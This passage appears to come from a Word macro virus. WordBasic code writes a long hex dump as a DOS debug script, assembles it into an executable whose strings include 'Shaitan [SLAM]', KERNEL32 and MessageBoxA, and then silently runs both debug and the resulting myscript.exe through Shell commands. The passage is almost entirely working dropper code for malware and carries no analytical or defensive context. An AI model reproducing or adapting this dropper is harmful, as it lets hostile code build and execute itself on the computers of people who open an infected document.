"e 1750 53 68 61 69 74 61 6e 20 5b 53 4c 41 4d 5d 00 ff " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1760 25 50 40 40 00 ff 25 54 40 40 00 ff 25 5c 40 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1770 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1780 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1790 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 17f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1800 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1810 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1820 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1830 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1840 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1850 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1860 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1870 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1880 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1890 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1900 41 59 41 4d 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1910 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1920 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1930 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1940 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1980 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1990 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1aa0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ab0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ac0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ad0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ae0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1af0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b00 3c 40 00 00 00 00 00 00 00 00 00 00 64 40 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b10 50 40 00 00 48 40 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b20 71 40 00 00 5c 40 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b30 00 00 00 00 00 00 00 00 00 00 00 00 7c 40 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b40 90 40 00 00 00 00 00 00 9e 40 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b50 7c 40 00 00 90 40 00 00 00 00 00 00 9e 40 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b60 00 00 00 00 4b 45 52 4e 45 4c 33 32 2e 64 6c 6c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b70 00 55 53 45 52 33 32 2e 64 6c 6c 00 00 00 47 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b80 74 4d 6f 64 75 6c 65 48 61 6e 64 6c 65 41 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b90 00 00 45 78 69 74 50 72 6f 63 65 73 73 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ba0 4d 65 73 73 61 67 65 42 6f 78 41 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1bb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1bc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1bd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1be0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1bf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ca0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1cb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1cc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1cd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ce0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1cf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d00 00 10 00 00 64 01 00 00 1b 30 20 30 28 30 3a 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d10 40 30 4c 30 51 30 78 30 96 30 9c 30 a5 30 bc 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d20 cd 30 d6 30 dc 30 e5 30 eb 30 f4 30 fa 30 05 31 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d30 0f 31 25 31 33 31 3b 31 48 31 61 31 78 31 85 31 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d40 9d 31 a3 31 b0 31 c7 31 e4 31 f5 31 04 32 25 32 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d50 39 32 47 32 4d 32 53 32 6d 32 73 32 8d 32 c2 32 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d60 ce 32 0b 30 38 33 52 33 e1 32 ea 32 f0 32 f6 32 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d70 ff 32 1e 33 24 33 2f 33 3e 33 48 33 6a 33 79 33 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d80 88 33 a6 33 ac 33 be 33 c4 33 ca 33 d4 33 df 33 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d90 ea 33 f0 33 00 34 0b 34 17 34 37 34 43 34 58 34 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1da0 6b 34 77 34 88 34 94 34 9e 34 a8 34 b5 34 c3 34 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1db0 d4 34 e0 34 f1 34 fb 34 04 35 10 35 1d 35 26 35 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1dc0 a7 35 b2 35 bd 35 c8 35 d3 35 de 35 e9 35 14 36 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1dd0 f4 35 1b 36 2a 36 32 36 43 36 54 36 6a 36 78 36 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1de0 80 36 89 36 97 36 9c 36 a9 36 b2 36 b8 36 c1 36 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1df0 ca 36 d0 36 dd 36 ea 36 f3 36 f9 36 0b 37 17 37 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e00 2d 37 32 37 48 37 4d 37 55 37 69 37 6e 37 76 37 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e10 8a 37 8f 37 97 37 ab 37 b0 37 b8 37 cc 37 e3 37 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e20 ec 37 fd 37 04 38 11 38 1a 38 20 38 28 38 2e 38 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e30 35 38 41 38 4f 38 58 38 64 38 6d 38 73 38 7c 38 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e40 88 38 91 38 97 38 a0 38 ad 38 b6 38 be 38 c9 38 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e50 6c 3b 74 3d 8a 3d a2 3d ba 3d d9 3d f8 3d 15 3e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e60 30 3e 00 00 00 20 00 00 14 00 00 00 14 30 19 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e70 61 30 67 30 6d 30 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ea0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1eb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ec0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ed0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ee0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ef0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fa0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fe0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ff0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2080 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2090 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"RCX" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"2000" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"W" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"Q" + _
Chr(34) + T$
WordBasic.Insert "Close #1" + T$
WordBasic.Insert "Shell " + Chr(34) + "debug < c:\myscript.scr > nul" + _
Chr(34) + T$
WordBasic.Insert "Shell " + Chr(34) + "c:\myscript.exe > nul" + _
Chr(34) + T$

End Sub

